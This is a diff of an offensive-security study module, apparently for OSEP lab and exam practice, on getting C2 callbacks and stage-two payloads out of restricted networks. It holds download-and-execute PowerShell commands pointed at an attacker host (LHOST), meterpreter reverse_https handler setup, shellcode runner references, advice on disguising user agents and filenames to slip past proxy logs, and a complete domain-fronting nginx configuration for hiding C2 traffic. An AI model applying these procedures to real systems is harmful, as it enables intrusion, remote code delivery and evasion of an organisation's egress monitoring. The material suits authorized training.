@@ -2,25 +2,21 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 09 · C2 callbacks and egress channels (staged / proxy / DNS / domain fronting)
+# C2 callbacks and egress channels
 
-> **Covers scenarios:** 17, 28, 29, 30, 31, 32, 33
->
-> **Course mapping:** Chapter 14 (§14.1 DNS Filters, §14.2 Web Proxies, §14.3–14.5 IDS/IPS & HTTPS Inspection, §14.6 Domain Fronting, §14.7 DNS Tunneling with dnscat2), Chapters 4/7/9 (staged vs. embedded payloads); Challenge 1, Challenge 2
->
-> **Prerequisites:** attacker box (Kali) + one entry session; HTTPS needs a self-signed certificate (generation in [00-environment-and-infra](/modules/00-environment-and-infra) §3); a DNS channel needs a domain whose NS records point at you, or lab-allowed direct UDP 53 to the attacker; domain fronting needs a CDN or a self-built nginx front-end that can forward by custom Host header.
+If code runs but the session or stage two never comes back, prove one reachable path first, then run every stage over that same path. Changing address, port, protocol, or proxy context mid-chain is the usual break.
 
-**Core idea**: this module solves "code runs, but the session / stage 2 never comes back". Every approach hangs off one **proven reachable path**: verify the path first (delivery, proxy, DNS resolution, TLS handshake), then run every stage over that same path. Changing address, port, protocol or proxy context at any stage is just scenario 30 again.
+HTTPS needs a self-signed certificate (generation in [00-environment-and-infra](/modules/00-environment-and-infra)). A DNS channel needs a domain whose NS records point at you, or lab-allowed direct UDP 53 to the attacker. Domain fronting needs a CDN or a self-built nginx front end that can forward by a custom Host header.
 
----
+## No stable egress, download stage never arrives
 
-## Scenario 17: Target has no stable egress, so the download-style stage 2 never arrives
+If the entry point executes but the target cannot reach your file server, every macro, script, and loader that depends on an ad-hoc download fails. Build **both** variants side by side: an embedded runner (shellcode + runner in one file / one process, zero external downloads) and a download stager. Do not keep only one — switching shape mid-exam and rebuilding costs time.
 
-**Situation**: the entry point executes code, but the target cannot reach your file server and only a few addresses are allowed out; every macro, script and loader that depends on an ad-hoc download fails.
-
-**Assumptions**: you have an entry point that executes code (VBA / HTA / JScript, see M01–M03); stage 2 sits on an internet-facing file server; DNS resolution on the target or any egress to that server fails; shellcode and runner are ready.
-
-**Prepare (attacker side)**: build **both variants side by side** for every entry point: the embedded variant (shellcode + runner in a single file / single process, zero external downloads) and the download variant (stager pulls stage 2 from the attacker box). Do not keep only one — switching shape mid-exam and rebuilding costs a lot of time.
+- [ ] Confirm the entry point executes with a harmless callback first (ping / nslookup / file write — module 01). Do not jump straight to a download
+- [ ] Map egress: `Test-NetConnection LHOST -Port 80/443` and `nslookup URL`
+- [ ] Egress works → use the download stager; egress blocked → switch to the embedded runner
+- [ ] If the embedded file is still too big or gets killed, move the heavy logic into in-memory JScript / C# (module 03)
+- [ ] Watch the delivery log (is there a GET?) and the listener (did a session establish?)
 
 ```bash
 # Embedded version prep: generate shellcode (confirm target bitness first, store x86/x64 separately)
@@ -31,22 +27,15 @@ cp ~/osep/payloads/win/x64/run.ps1 ~/osep/payloads/PAYLOAD
 python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads   # request log confirms "did it actually download"
 ```
 
-**Procedure**:
-1. Confirm the entry point executes with a harmless callback first (callback ping / nslookup / file write, see M01). Do **not** jump straight to the download variant: if even the callback cannot get out, the download is guaranteed to fail.
-2. Map the target's egress: from the target run `Test-NetConnection LHOST -Port 80/443` and `nslookup URL`, and record which path works.
-3. Egress works → use the download-variant stager (the download-and-execute shapes in `docs/01` scenario 3 and `docs/03` scenario 9); egress blocked → switch to the embedded variant and deliver stage 2 embedded in a single runner file.
-4. Embedded variant is still too big or gets killed (scenarios 18–19) → use M03's "bridge + C# stage 2" to move the heavy logic into in-memory JScript/C#, so nothing lands on disk and nothing is downloaded.
-5. After delivery, watch the m00 server log (is there a GET?) and the listener (did a session establish?).
+A GET from the target IP in the m00 log means the download path works; a session on the listener means the whole chain works. With no log entry and no session, check the three basic callbacks to tell "the entry point never ran" apart from "egress is blocked".
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m00-delivery-server.py` | Delivery and request log for the download variant | `--port 80 --dir ~/osep/payloads` |
-| `m01-shellcode-runner-vba-archbranch.vba` | Embedded-variant reference (check bitness, then pick shellcode) | paste the shellcode block |
-| `m03-dotnettojscript-loader.js` | Bridge reference for an embedded stage 2 | paste the C# payload |
-| `m09-proxy-aware-downloader.ps1` | Downloader for when downloads must go through the system proxy | see scenario 28 |
+If there is no egress at all (not even DNS), drop callback-based options and go offline-drop: write to disk plus a scheduled task or service, and have results written to a file that another entry point retrieves (module 01). If only a few domains or ports are allowed, use the proxy, domain fronting, or HTTPS on 443 (below). If the embedded variant runs but exits instantly, it is usually a bitness mismatch — use the archbranch runner.
 
-#### `m00-delivery-server.py`
+Keep the embedded and download variants in **separate directories** with clear comments, so you do not deliver the wrong file. Embedded shellcode carries static signatures by default — encode or encrypt it per module 05 when needed. Code execution does not imply egress: verify the path before you run the payload.
+
+Reference runners: `m01-shellcode-runner-vba-archbranch.vba` (embedded, check bitness then pick shellcode) and `m03-dotnettojscript-loader.js` (bridge + C# stage 2). When a download must go through the system proxy, use `m09-proxy-aware-downloader.ps1` (next section).
+
+::: details `m00-delivery-server.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -201,7 +190,8 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-shellcode-runner-vba-archbranch.vba`
+:::
+::: details `m01-shellcode-runner-vba-archbranch.vba` · click to expand
 
 ````vb
 ' Purpose: use VBA compile-time constants to auto-match Office bitness, so a Runner with mismatched bitness does not crash the host
@@ -287,7 +277,8 @@ Sub Document_Open()
 End Sub
 ````
 
-#### `m03-dotnettojscript-loader.js`
+:::
+::: details `m03-dotnettojscript-loader.js` · click to expand
 
 ````javascript
 /*
@@ -345,7 +336,38 @@ WScript.Echo("[*] the host info above confirms whether the artifact platform (--
 WScript.Quit(0);
 ````
 
-#### `m09-proxy-aware-downloader.ps1`
+:::
+## Browser works, payload cannot call back directly
+
+If the target only reaches the internet through a corporate proxy, the browser works and a raw TCP — or an HTTP client that ignores the proxy — fails. Read the proxy first, prove a harmless download through it, then run the callback over that same path (443 is the safest). A domain user context can usually pass an NTLM token through.
+
+- [ ] Start the delivery server and the HTTPS listener
+- [ ] Read the user proxy settings (WinINet)
+- [ ] Connectivity test with `m09-proxy-aware-downloader.ps1` (default mode picks up the system proxy)
+- [ ] If you get HTTP 407, add `-DefaultCreds` or `-ProxyUser` / `-ProxyPass`
+- [ ] Reuse the same proxy parameters on the stager and the HTTPS reverse handler
+- [ ] Record "user context + proxy → works" as the baseline for the SYSTEM comparison below
+
+```powershell
+# Target side: read the user proxy settings (WinINet)
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
+```
+
+```powershell
+# Download to a file through the automatic system proxy:
+powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -OutFile C:\Windows\Temp\PAYLOAD
+# Or download and IEX:
+powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command
+```
+
+A GET from the proxy or target in the m00 log, plus matching file content (or callback output in `-Command` mode), means the path works.
+
+If the browser uses its own proxy (Firefox configured separately) while the system proxy is empty, read the address out of the browser settings and switch to an explicit `-ProxyUrl http://proxy:port`. If the proxy demands authentication and the current token is rejected, use known credentials with `-ProxyUser` / `-ProxyPass`. On a plaintext HTTP proxy those credentials are exposed — keep traffic on HTTPS where you can. If the proxy only allows whitelisted domains, go to domain fronting or DNS.
+
+The proxy log shows destination URLs: use unremarkable filenames and HTTPS for the callback. Keep the UA consistent inside one session (the m09 script sends a browser UA by default). Do not leave domain credentials in plaintext in the command-line history; use `-DefaultCreds` when you can.
+
+::: details `m09-proxy-aware-downloader.ps1` · click to expand
 
 ````powershell
 <#
@@ -483,61 +505,16 @@ try {
 }
 ````
 
-**Validation**: a GET from the target IP in the m00 log means the download path works; a session on the listener means the whole chain works. With no log entry and no session, check the three basic callbacks (ping / nslookup / file write) to tell "the entry point never ran" apart from "egress is blocked".
+:::
+## User-context works, SYSTEM loses the channel
 
-**Failure branches and alternatives**:
-- No egress at all (not even DNS) → drop callback-based options and go offline-drop: write to disk plus a scheduled task or service for persistence, and have the results written to a file that another entry point retrieves (M01 scenario 5).
-- Only a few domains or ports are allowed → use the proxy (scenario 28), domain fronting (scenario 33), or HTTPS on 443 (scenario 31).
-- Embedded variant runs but exits instantly → bitness mismatch or shellcode generated for the wrong architecture; use the archbranch version (M01).
+If comms work before elevation and fail as SYSTEM on the same host and address, the two identities use different proxy settings and authentication contexts. The user-context proxy lives in HKCU (WinINet); SYSTEM uses WinHTTP (`netsh winhttp`). The two **do not share settings**, and SYSTEM has none of the user's credential context.
 
-**Exam / OPSEC notes**: keep the embedded and download variants in **separate directories** with clear comments, so you do not deliver the wrong file and burn 10 minutes. Embedded shellcode carries static signatures by default — encode or encrypt it per M05 when needed. "Code execution does not imply egress": verify the path before you run the payload.
-
----
-
-## Scenario 28: A normal user browses the web fine, but your payload cannot call back directly
-
-**Situation**: the target only reaches the internet through the corporate proxy. The browser works; raw TCP, or an HTTP client that ignores the proxy, fails.
-
-**Assumptions**: you have a normal user session that can run PowerShell; the target has a system or per-user proxy configured (HKCU Internet Settings, or a browser-internal proxy); the proxy may require NTLM authentication (a domain user context usually passes the token through).
-
-**Prepare (attacker side)**: start the delivery server and the HTTPS listener (m00 or m09-https-listener.sh). Read the proxy configuration from the target first and confirm that going through the proxy is enough to reach your address.
-
-```powershell
-# Target side: read the user proxy settings (WinINet)
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
-```
-
-**Procedure**:
-1. Run a connectivity test with `m09-proxy-aware-downloader.ps1`: the default mode picks up the system proxy automatically and downloads a harmless file (you should see the GET in the m00 log).
-2. HTTP 407 (proxy authentication failed) → add `-ProxyUser DOMAIN\USER -ProxyPass PASS` (or `-DefaultCreds` to pass the current token through as NTLM).
-3. Once downloads work, use the same path for the callback: the port and address of the HTTPS reverse handler must be reachable through it (443 is the safest); add the same proxy parameters to a PowerShell stager that downloads and executes.
-4. Record "user context + proxy → works" as the baseline you will compare against in scenario 29.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m09-proxy-aware-downloader.ps1` | Downloads through the system or an explicit proxy, with authentication | `-Url http://LHOST/PAYLOAD -OutFile` or `-Command` |
-| `m00-delivery-server.py` | Delivery plus confirmation that the target really issued the request | `--port 80 --dir ~/osep/payloads` |
-
-**Validation**: a GET from the proxy/target appears in the m00 log; a script downloaded in `-Command` mode produces callback output when it runs; the test file content matches the source.
-
-**Failure branches and alternatives**:
-- The browser uses its own proxy (Firefox configured separately) while the system proxy is empty → read the proxy address out of the browser settings and switch to an explicit `-ProxyUrl http://proxy:port`.
-- The proxy demands authentication and the current token is rejected → use known credentials with `-ProxyUser/-ProxyPass`. On a plaintext HTTP proxy those credentials are exposed to the proxy, so keep traffic on HTTPS where possible.
-- The proxy only allows whitelisted domains → domain fronting (scenario 33) or DNS (scenario 32).
-
-**Exam / OPSEC notes**: the proxy log shows destination URLs → use unremarkable filenames during the download stage and HTTPS for the callback. Keep the UA consistent inside one session (the m09 script sends a browser UA by default). Do not leave domain credentials in plaintext in the command-line history; use `-DefaultCreds` instead when you can.
-
----
-
-## Scenario 29: The user-context session calls back, but SYSTEM loses the channel
-
-**Situation**: same host, same address — comms work before elevation and fail as SYSTEM, because the two identities use different proxy settings and authentication contexts.
-
-**Assumptions**: you have elevated from a user session to SYSTEM (service, scheduled task, token duplication and similar entry points); corporate egress must go through the proxy; the user-context proxy lives in HKCU (WinINet) while SYSTEM uses WinHTTP by default (`netsh winhttp`). The two **do not share settings**, and SYSTEM has none of the user's credential context.
-
-**Prepare (attacker side)**: start your listener, then compare the output of the two proxy chains on the target first:
+- [ ] Before elevation, record the evidence that "user + proxy" works
+- [ ] After elevation, compare `netsh winhttp show proxy` with the user's WinINet settings
+- [ ] Either set the machine WinHTTP proxy (save and reset afterward) or pass an explicit `-ProxyUrl` in the SYSTEM session
+- [ ] If the proxy rejects SYSTEM's authentication, run the egress part back in the user context, or switch to DNS
+- [ ] Only move the handler to stage 2 once the SYSTEM callback path works
 
 ```cmd
 rem target side (user shell)
@@ -549,58 +526,44 @@ whoami                            rem confirm nt authority\system
 netsh winhttp show proxy
 ```
 
-**Procedure**:
-1. Before elevation, record the evidence that "user + proxy" works (the output from scenario 28).
-2. After elevation, do the minimal check first: can SYSTEM open raw TCP and download? If not, check whether the WinHTTP proxy is empty or differs from the user's.
-3. Option A (change the machine proxy; needs administrator rights, which SYSTEM already has): `netsh winhttp set proxy proxy-server="http://proxy:8080" bypass-list="<local>"`. Save the original values from `netsh winhttp show proxy` first so you can roll back, and run `netsh winhttp reset proxy` when you are done.
-4. Option B (leave the machine alone): in the SYSTEM session use a downloader or client that accepts explicit proxy parameters (`m09-proxy-aware-downloader.ps1 -ProxyUrl ... -ProxyUser ...`) so each component carries its own proxy settings.
-5. Option C (authentication-context problem): if the proxy rejects SYSTEM's anonymous/NTLM authentication, run the payloads that need egress back in the user context (for example a scheduled task running as that user), or switch to a channel that needs no proxy authentication (DNS, scenario 32).
-6. Only let the handler move to stage 2 once the callback path works, and record the proxy parameters throughout.
+Option A (change the machine proxy; SYSTEM already has the rights): `netsh winhttp set proxy proxy-server="http://proxy:8080" bypass-list="<local>"`. Save the original values from `netsh winhttp show proxy` first, and run `netsh winhttp reset proxy` when you are done.
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m09-proxy-aware-downloader.ps1` | Downloader for both contexts; use an explicit proxy under SYSTEM | `-ProxyUrl http://proxy:8080 -DefaultCreds` |
-| `m00-delivery-server.py` | Confirm that SYSTEM really reaches the delivery address | `--port 80` |
+Option B (leave the machine alone): in the SYSTEM session use a client that accepts explicit proxy parameters (`m09-proxy-aware-downloader.ps1 -ProxyUrl ... -ProxyUser ...`) so each component carries its own settings.
 
-**Validation**: a GET appears in the m00 log under the SYSTEM context, or the callback succeeds after `netsh winhttp show proxy` shows the proxy is set; you can explain the output difference between the before/after control runs.
+Option C (authentication-context problem): if the proxy rejects SYSTEM's anonymous or NTLM authentication, spawn the egress payload from the user context (for example a scheduled task running as that user), or switch to a channel that needs no proxy authentication (DNS, below).
 
-**Failure branches and alternatives**:
-- You are not allowed to change the machine proxy (it would break egress for system services) → use an M08 tunnel: forward at a location the target can reach and push the traffic through the user context or a pivot.
-- The proxy has no usable credentials for SYSTEM → spawn a process out of the user context that carries those credentials for the egress part, or switch to the DNS channel.
-- The privilege-escalation entry point is itself non-interactive (a service restart, for example) → bake the proxy parameters into the payload command line before you trigger it.
+A GET in the m00 log under the SYSTEM context, or a callback after `netsh winhttp show proxy` shows the proxy is set, closes the loop — you should be able to explain the before / after difference.
 
-**Exam / OPSEC notes**: `netsh winhttp set proxy` affects the **whole machine**; on an exam network it can break other services or even be judged as destructive. Always save the original values and reset when you are done. Keep SYSTEM callbacks on ordinary ports such as 443/80. Test and record the "user vs SYSTEM" paths once each; do not keep retrying user-context parameters under SYSTEM and waste time.
+If you are not allowed to change the machine proxy (it would break egress for system services), use a module 08 tunnel: forward at a location the target can reach and push the traffic through the user context or a pivot. If the privilege-escalation entry point is itself non-interactive (a service restart), bake the proxy parameters into the payload command line before you trigger it.
 
----
+`netsh winhttp set proxy` affects the **whole machine**; on an exam network it can break other services. Always save the original values and reset when you are done. Keep SYSTEM callbacks on ordinary ports such as 443 / 80. Test and record the "user vs SYSTEM" paths once each; do not keep retrying user-context parameters under SYSTEM.
 
-## Scenario 30: Stage 1 calls back, but stage 2 never appears
+## Stage 1 comes back, stage 2 never appears
 
-**Situation**: the entry point reaches your listener, but a later stage uses a different address, port or protocol — a path the target does not allow, or one you never configured.
+If the entry point reaches your listener but a later stage uses a different address, port, or protocol — a path the target does not allow, or one you never configured — stage 2 will not appear. Keep a path card per session: entry point → download address / protocol / port → listener address / protocol / port → proxy context → UA. Whenever a stage changes path, update the card before you run it. Follow the port plan in [00-environment-and-infra](/modules/00-environment-and-infra) (80 delivery, 443 callback, 4444 fallback).
 
-**Assumptions**: stage 1 (stager/callback) works; the listener and delivery infrastructure on the attacker box follow the fixed port plan in `docs/00` (80 delivery, 443 callback, 4444 fallback).
+- [ ] If stage 2 is download-and-execute, check the delivery log for a stage-2 GET. None → the target never reached the download address; present but no session → execution or bitness (module 05)
+- [ ] Rule out address, port, protocol, and proxy-context mismatches one by one
+- [ ] Prefer stageless (one connection carries everything) if staged keeps depending on a second path
+- [ ] Set `ExitOnSession false` on the listener so the first session dropping does not shut the handler down
 
-**Prepare (attacker side)**: keep a "path card" per session with fixed fields: entry point → download address/protocol/port → listener address/protocol/port → proxy context → UA. Whenever a stage changes path, update the card before you run it.
+Usual root causes:
 
-**Procedure**:
-1. Locate the break: if stage 2 is download-and-execute, check the m00/nginx log for a stage-2 GET from the target. None → the target never reached the download address; present but no session → execution or bitness problem (go to M05).
-2. Rule out the usual root causes one by one:
-   - Address mismatch: the LHOST written into the stager is an internal address or localhost while the listener sits on another interface — standardize on one interface IP.
-   - Port mismatch: the payload was generated with LPORT=4444 but the listener is on 443.
-   - Protocol mismatch: stage 1 works over HTTP while stage 2's reverse_https is blocked at the egress → run every stage over the protocol you already proved (443/HTTPS, or the proxy path).
-   - Proxy context: stage 1 downloads fine in the user context while stage 2 is triggered by SYSTEM (see scenario 29).
-   - The delivery server is not running, the directory name is wrong, or the `PAYLOAD` filename differs in case or path.
-3. The most robust move: replace staged (connect, then fetch) with **stageless** (one connection carries everything), so stage 2 does not inherently depend on a second path. If you must stay staged, run both stages through the same delivery server and the same URL template.
-4. Set `set ExitOnSession false` on the listener, so the first session dropping does not shut down the whole handler.
+- Address mismatch: the LHOST written into the stager is an internal address or localhost while the listener sits on another interface — standardize on one interface IP.
+- Port mismatch: the payload was generated with `LPORT=4444` but the listener is on 443.
+- Protocol mismatch: stage 1 works over HTTP while stage 2's `reverse_https` is blocked at the egress — run every stage over the protocol you already proved (443 / HTTPS, or the proxy path).
+- Proxy context: stage 1 downloads fine in the user context while stage 2 is triggered by SYSTEM (see the previous section).
+- The delivery server is not running, the directory name is wrong, or the `PAYLOAD` filename differs in case or path.
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m09-https-listener.sh` | Single entry point for HTTPS/HTTP handlers | `--mode msf --payload windows/x64/meterpreter/reverse_https` |
-| `m00-delivery-server.py` | Stage-2 delivery plus request log | `--port 80 --dir ~/osep/payloads` |
-| `m09-proxy-aware-downloader.ps1` | Stage-2 download when it has to go through a proxy | `-Url http://LHOST/PAYLOAD -Command` |
+If you must stay staged, run both stages through the same delivery server and the same URL template. `m09-https-listener.sh` is the single entry point for the HTTPS / HTTP handler (`--mode msf --payload windows/x64/meterpreter/reverse_https`).
 
-#### `m09-https-listener.sh`
+Every stage on the path card should be marked "path verified in practice" (delivery log GET / handshake log / session). After a drop, the callback should still return (`ExitOnSession false`).
+
+If the target requested stage 2 but the process was killed, that is static or behavioural detection — handle it per module 05 instead of changing addresses again. If the request never arrived at all, check the proxy and the identity context against the two sections above. If staged keeps failing, switch to a single-path stageless payload; if that still fails, check the listener payload bitness (x86 / x64).
+
+The biggest point-loser is assuming success because stage 1 worked — do not move on until you see the stage-2 session. Record the path card at every stage so you are not guessing URLs and ports from memory.
+
+::: details `m09-https-listener.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -921,204 +884,45 @@ esac
 exit 0
 ````
 
-**Validation**: every stage on the path card is marked "path verified in practice" (delivery log GET / handshake log / session); after a drop, the callback still returns (with ExitOnSession false).
+:::
+## Only HTTPS is allowed, inspection breaks the channel
 
-**Failure branches and alternatives**:
-- The target requested stage 2 but the process was killed → static or behavioural detection; handle it per M05 scenarios 18–19 instead of changing addresses again.
-- The request never arrived at all → check the proxy and the identity context against scenarios 28/29.
-- Staged keeps failing → switch to a single-path stageless payload; if that still fails, check the listener payload bitness (x86/x64).
+If the target reaches ordinary HTTPS sites but your payload fails at the TLS handshake or at the request, there is proxy inspection, certificate trust, or application-layer (UA / path) filtering in the way. Narrow it down: `Test-NetConnection LHOST -Port 443` — connects but TLS fails → certificate or middlebox; cannot connect at all → the egress filters on IP / SNI.
 
-**Exam / OPSEC notes**: the biggest point-loser is assuming success because stage 1 worked — do not move on until you see the stage-2 session. Record the path card at every stage so you are not guessing URLs and ports from memory.
+- [ ] Generate certificates and start HTTPS delivery / listening, with both certificate strategies ready
+- [ ] Prove TCP 443, then the TLS handshake, then the request
+- [ ] If PowerShell rejects a self-signed cert, skip validation on the client or import the cert
+- [ ] If a middlebox re-signs, switch to a domain it allows plus a trusted certificate (or domain fronting)
+- [ ] Disguise UA / path; if HTTPS has to go through a proxy, combine with the proxy section
 
----
+Self-signed: `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=LHOST"` (passes when the target does not validate the root; **note the fingerprint** for troubleshooting). Trusted: a public domain plus Let's Encrypt (most reliable when there is no MITM at the egress); if the lab network has an internal CA, import its root into the trust store instead.
 
-## Scenario 31: Only HTTPS is allowed out, but HTTPS inspection breaks the channel
+```bash
+bash m09-https-listener.sh --mode cert --domain DOMAIN
+bash m09-https-listener.sh --mode ssl-test --port 8443 --to 4444
+bash m09-https-listener.sh --mode serve --port 443
+bash m09-https-listener.sh --mode msf --port 443 --lhost LHOST
+```
 
-**Situation**: the target reaches ordinary HTTPS sites, but your payload fails at the TLS handshake or at the request stage — there is proxy inspection, certificate trust, or application-layer (UA/path) filtering in the way.
+Handshake failure: use the HTTPS listener log to see whether the handshake happened and what the client reported (untrusted certificate, hostname mismatch). PowerShell rejects a self-signed certificate by default — add `-SkipCertificateCheck` (PS 7) or a `ServerCertificateValidationCallback` (PS 5, handled inside `m09-proxy-aware-downloader.ps1 -SkipCertCheck`), or import the self-signed certificate into the target's trusted roots.
 
-**Assumptions**: the egress only allows 443/HTTPS; a TLS middlebox (MITM re-signing) may exist, or inspection that only allows whitelisted domains; your listener can serve HTTPS and show handshake and request logs.
+Middlebox MITM re-signing: the target trusts the middlebox root, so a self-signed certificate is guaranteed to fail — switch to a domain the middlebox allows plus a trusted certificate, or domain fronting (next section). Application-layer filtering: disguise the request headers with a common browser UA (`m09-https-listener.sh` logs the UA so you can check it); keep paths and query strings unremarkable.
 
-**Prepare (attacker side)**: generate certificates and start HTTPS delivery/listening, with both certificate strategies ready:
-- Self-signed: `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=LHOST"` (passes when the target does not validate the root; **note the fingerprint** for troubleshooting).
-- Trusted certificate: a public domain plus Let's Encrypt (most reliable when there is no MITM at the egress); if the lab network has an internal CA, you can import its root into the trust store instead.
+The handshake log should show the target completing TLS (or msf shows a session). You should be able to explain the difference between "the target reaches public HTTPS fine" and "the target fails against us".
 
-**Procedure**:
-1. Narrow it down point by point: can the target open TCP to your 443 (`Test-NetConnection LHOST -Port 443`)? Connects but TLS fails → certificate or middlebox problem. Cannot connect at all → the egress filters on IP/SNI.
-2. Handshake failure, certificate triage: use the HTTPS listener log to see whether the handshake happened and what the client reported (untrusted certificate, hostname mismatch). PowerShell rejects a self-signed certificate by default → add `-SkipCertificateCheck` on the client (PS 7) or a `ServerCertificateValidationCallback` (PS 5, handled inside the script), or import the self-signed certificate into the target's trusted roots.
-3. Middlebox MITM re-signing: the target trusts the middlebox root, so a self-signed certificate is guaranteed to fail → switch to a domain the middlebox allows plus a trusted certificate (see the failure branches and domain fronting, scenario 33).
-4. Application-layer filtering, UA/path triage: disguise the request headers with a common browser UA (m09-https-listener.sh logs the UA so you can check it); keep paths and query strings unremarkable.
-5. If HTTPS has to go through a proxy → combine with scenario 28: proxy parameters plus an HTTPS client.
+If the middlebox re-signs and the chain is validated, find a domain it allows and use domain fronting, or check whether the lab grants an exemption. If the egress whitelists by SNI or destination IP, same move; if it will not even resolve non-whitelisted domains, go to DNS. If the client skips validation but the handshake still fails, check the TLS version and cipher suites (WinHTTP defaults are usually fine; older systems may need a downgraded configuration).
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m09-https-listener.sh` | HTTPS listener: msf reverse_https handler or TLS test mode, logging UA and handshakes | `--mode msf\|ssl-test --cert cert.pem --key key.pem` |
-| `m09-domain-fronting-nginx.conf` | Front-end template when you need per-domain forwarding or SNI handling | see scenario 33 |
-| `m09-proxy-aware-downloader.ps1` | HTTPS download with a certificate-validation switch | `-Url https://LHOST/PAYLOAD -SkipCertCheck` |
+A self-signed fingerprint stands out — when troubleshooting, first confirm the fingerprint in the listener log is yours. Keep the UA consistent with the delivery / download stages. HTTPS does not encrypt the Host / SNI that a proxy sees, so never put secrets in the URL.
 
-#### `m09-domain-fronting-nginx.conf`
+## HTTP(S) is dead, DNS still works
 
-````nginx
-# Purpose: domain fronting front-end config -- the TLS layer uses the front-end domain DOMAIN that the target permits (SNI + certificate),
-#       the HTTP Host header carries the real back-end identifier URL, and nginx forwards the request to the back-end C2 (LHOST:LPORT) by Host.
-#       egress inspection sees SNI/certificate/destination = DOMAIN (permitted); the back-end is decided only inside nginx by Host.
-# Scenario: 33 (target permits only specific front-end addresses, direct back-end connection fails; lab infrastructure supports front-end/back-end separation), 31 (HTTPS inspection bypass)
-# Dependencies: nginx (SNI split routing in the stream block needs the --with-stream_ssl_preread module; without that module, the http block alone can do Host-based split routing);
-#       a TLS certificate for DOMAIN (self-signed works if the target does not validate or we already ignore certificate validation); back-end C2/delivery listener (m09-https-listener.sh)
-# Usage:
-#   1) replace all placeholders, then put it at /etc/nginx/nginx.conf (or include the http{} contents into an existing config)
-#   2) nginx -t && nginx -s reload
-#   3) verify from the target: curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
-# Placeholders: DOMAIN=front-end domain (the target is allowed to reach it; used for SNI and the certificate), URL=back-end identifier (put it in the Host header, nginx routes by it),
-#         LHOST=back-end C2 listen address, LPORT=back-end C2 port, PAYLOAD=delivered file name
-# Test status: not tested on a local nginx; the config structure was checked by hand against nginx syntax (map / upstream / if+proxy_pass usage)
+If neither direct connections nor the usual proxy work but DNS egress still does, and the lab or exam explicitly allows a DNS tunnel (course §14.7), use the DNS channel. You need a domain (or a lab-allowed name) whose NS records point at the attacker, or the target can reach you directly on UDP 53. This module ships a minimal pair (`m09-dns-c2-server.py` + `m09-dns-c2-client.py`) to confirm the channel and push commands; bring in dnscat2 / iodine only if you need a full tunnel. Without Python on the target, deliver an interpreter first, switch to the dnscat2 binary, or port the client to `Resolve-DnsName` (notes in the client script header).
 
-worker_processes auto;
-
-events {
-    worker_connections 1024;
-}
-
-http {
-    default_type application/octet-stream;
-    sendfile on;
-    keepalive_timeout 15;
-
-    # ---- Back-end identifier check: Host header equal to URL goes to the back-end; anything else (including DOMAIN itself) returns the cover page ----
-    # in nginx "1" is true / "0" is false, so use 0/1 here instead of yes/no
-    map $http_host $is_backend {
-        default        0;
-        "URL"          1;
-    }
-
-    upstream c2_backend {
-        server LHOST:LPORT;
-        keepalive 8;
-    }
-
-    # ---- Triage log: records SNI, Host and UA together (scenario 31 triage for "handshake succeeds but the request is blocked") ----
-    log_format fronting '$remote_addr [$time_local] sni=$ssl_server_name '
-                        'host=$http_host ua="$http_user_agent" '
-                        'proto=$ssl_protocol req="$request" status=$status backend=$is_backend';
-    access_log /var/log/nginx/fronting-access.log fronting;
-    error_log  /var/log/nginx/fronting-error.log warn;
-
-    # ---- Front-end: terminates TLS on 443, the certificate belongs to DOMAIN ----
-    server {
-        listen 443 ssl default_server;
-        server_name DOMAIN;
-
-        ssl_certificate     /etc/nginx/certs/DOMAIN.crt;
-        ssl_certificate_key /etc/nginx/certs/DOMAIN.key;
-        ssl_protocols       TLSv1.2 TLSv1.3;
-        ssl_prefer_server_ciphers off;
-        ssl_session_cache   shared:fronting:1m;
-
-        # SNI notes (important):
-        #   - the client must make SNI = DOMAIN (with curl, specify --resolve DOMAIN:443:LHOST; with PowerShell just use https://DOMAIN/)
-        #   - if the client also sets SNI to URL, egress inspection sees a domain that is not permitted and domain fronting fails
-        #   - nginx $ssl_server_name is only for logging; this config does no SNI validation (otherwise it would reject Host=URL requests)
-
-        # do not let buffering truncate large requests (staged payload / uploads)
-        client_max_body_size 64m;
-        proxy_request_buffering off;
-        proxy_buffering off;
-
-        # the cover response and the back-end response are both returned as plain text so the site does not look anomalous
-        default_type text/plain;
-
-        # explicit path entry: even if the Host check fails, a fixed path can still forward to the back-end (handy for a quick pre-exam check)
-        location = /PAYLOAD {
-            proxy_pass http://c2_backend;
-            proxy_http_version 1.1;
-            proxy_set_header Host              $http_host;
-            proxy_set_header X-Forwarded-For   $remote_addr;
-            proxy_set_header X-Forwarded-Proto https;
-            proxy_set_header Connection        "";
-        }
-
-        location / {
-            # Host=URL -> forward to the back-end C2; keep the original Host so the back-end can identify its own vhost by Host
-            if ($is_backend) {
-                proxy_pass http://c2_backend;
-                proxy_http_version 1.1;
-                proxy_set_header Host              $http_host;
-                proxy_set_header X-Forwarded-For   $remote_addr;
-                proxy_set_header Connection        "";
-                break;
-            }
-
-            # any other Host (including a normal visit to DOMAIN) -> return a harmless page as cover
-            return 200 "ok\n";
-        }
-    }
-
-    # ---- Plaintext 80: only for local/nginx self connectivity tests, no forwarding ----
-    server {
-        listen 80 default_server;
-        server_name DOMAIN;
